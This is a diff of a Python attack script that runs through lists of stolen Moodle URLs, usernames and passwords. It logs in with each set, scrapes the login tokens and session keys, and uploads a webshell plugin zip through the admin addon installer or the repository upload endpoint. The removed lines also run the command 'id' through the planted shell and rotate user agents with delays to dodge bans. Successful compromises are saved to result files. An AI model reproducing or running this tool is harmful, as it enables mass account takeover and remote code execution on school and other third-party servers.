@@ -1,114 +1,89 @@
-import requests, os, threading, argparse, time, random
+import requests
+import re
+import os
+import argparse
 from urllib.parse import urljoin
-from queue import Queue
+from concurrent.futures import ThreadPoolExecutor
 
-lock = threading.Lock()
-q = Queue()
+requests.packages.urllib3.disable_warnings()
 
-headers_list = [
-    {"User-Agent": "Mozilla/5.0"},
-    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
-    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
-]
+def save_result(filename, text):
+    os.makedirs("result", exist_ok=True)
+    with open(f"result/{filename}", "a", encoding="utf-8") as f:
+        f.write(text.strip() + "\n")
 
-def login(session, login_url, username, password):
+def get_login_token(session, url):
     try:
-        r = session.get(login_url, timeout=15, headers=random.choice(headers_list), verify=False)
-        token = r.text.split('logintoken" value="')[1].split('"')[0]
-        data = {
-            "username": username,
-            "password": password,
-            "logintoken": token
-        }
-        r = session.post(login_url, data=data, headers=random.choice(headers_list), timeout=15, verify=False)
-        return "dashboard" in r.url or "loginsuccess" in r.text
+        r = session.get(url, timeout=15, verify=False)
+        token = re.findall(r'name="logintoken" value="(.*?)"', r.text)
+        return token[0] if token else None
     except:
-        return False
+        return None
 
-def upload_shell(session, base_url):
+def process(line):
     try:
-        upload_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
-        files = {
-            'repo_upload_file': ('moodle_webshell.zip', open('moodle_webshell.zip', 'rb'), 'application/zip')
-        }
-        session.get(upload_url, headers=random.choice(headers_list), timeout=15)
-        r = session.post(upload_url, files=files, headers=random.choice(headers_list), timeout=15)
-        return "Plugin installed" in r.text or "successfully installed" in r.text
-    except:
-        return False
-
-def exec_test(session, base_url):
-    try:
-        test_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
-        r = session.get(test_url, headers=random.choice(headers_list), timeout=15)
-        return "uid=" in r.text
-    except:
-        return False
-
-def process(target):
-    try:
-        url, user, pwd = target.strip().split("|")
-        base_url = url.split("/login")[0]
+        url, username, password = line.strip().split("|")
         session = requests.Session()
+        token = get_login_token(session, url)
+        if not token:
+            return
 
-        result = []
+        login_data = {
+            "anchor": "",
+            "logintoken": token,
+            "username": username,
+            "password": password
+        }
 
-        if login(session, url, user, pwd):
-            result.append(f"1.Login success ✅ {url}|{user}|{pwd}")
+        base_url = url.split("/login")[0]
+        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=False)
 
-            if upload_shell(session, base_url):
-                shell_url = f"{base_url}/local/moodle_webshell/webshell.php"
-                result.append(f"2.Upload webshell ✅ {shell_url}")
+        if login.status_code == 303 and "MOODLEID1_=deleted" in login.headers.get("Set-Cookie", ""):
+            save_result("login_success.txt", line)
+            install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
+            r = session.get(install_url, timeout=15, verify=False)
+            sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
+            if not sesskey:
+                return
 
-                access_url = f"{shell_url}?action=exec&cmd=id"
-                if exec_test(session, base_url):
-                    result.append(f"3.Access: {access_url}")
-                    result.append("4.Result: ✅ Webshell OK")
-                    save_result("success.txt", result)
-                else:
-                    result.append("3.Access Failed ❌")
-                    save_result("partial.txt", result)
-            else:
-                result.append("2.Upload Failed ❌")
-                result.append("3.No Webshell")
-                result.append("4.Only login success.")
-                save_result("only_login.txt", result)
-        else:
-            result.append(f"4.❌ Login Failed: {url}")
-            save_result("failed.txt", result)
-    except Exception as e:
-        save_result("error.txt", [f"[ERROR] {target} -> {str(e)}"])
+            sesskey = sesskey[0]
+            files = {
+                'repo_upload_file': ('moodle_webshell.zip', open('moodle_webshell.zip', 'rb'), 'application/zip')
+            }
+            data = {
+                "sesskey": sesskey,
+                "repo_id": 1,
+                "itemid": 123456,
+                "author": "Admin",
+                "license": "allrightsreserved"
+            }
 
-def save_result(filename, lines):
-    with lock:
-        with open(filename, "a") as f:
-            f.write("\n".join(lines) + "\n" + "-"*40 + "\n")
+            upload = session.post(
+                urljoin(base_url, "/repository/repository_ajax.php?action=upload"),
+                files=files,
+                data=data,
+                verify=False,
+                timeout=20
+            )
 
-def worker():
-    while not q.empty():
-        target = q.get()
-        process(target)
-        time.sleep(random.uniform(2, 5))  # anti ban
-        q.task_done()
+            if "url" in upload.text:
+                save_result("upload_success.txt", line)
+    except:
+        pass
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--list', help='File list target')
-    parser.add_argument('--thread', type=int, default=5)
+    parser.add_argument("--list", required=True, help="Path ke file list.txt")
+    parser.add_argument("--thread", type=int, default=10, help="Jumlah thread")
     args = parser.parse_args()
 
-    with open(args.list, 'r') as f:
-        for line in f:
-            q.put(line.strip())
+    with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
+        lines = [i.strip() for i in f if i.strip()]
 
-    threads = []
-    for _ in range(args.thread):
-        t = threading.Thread(target=worker)
-        t.start()
-        threads.append(t)
+    with ThreadPoolExecutor(max_workers=args.thread) as exe:
+        exe.map(process, lines)
 
-    for t in threads:
-        t.join()
+    print("Selesai! Cek folder 'result'.")
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
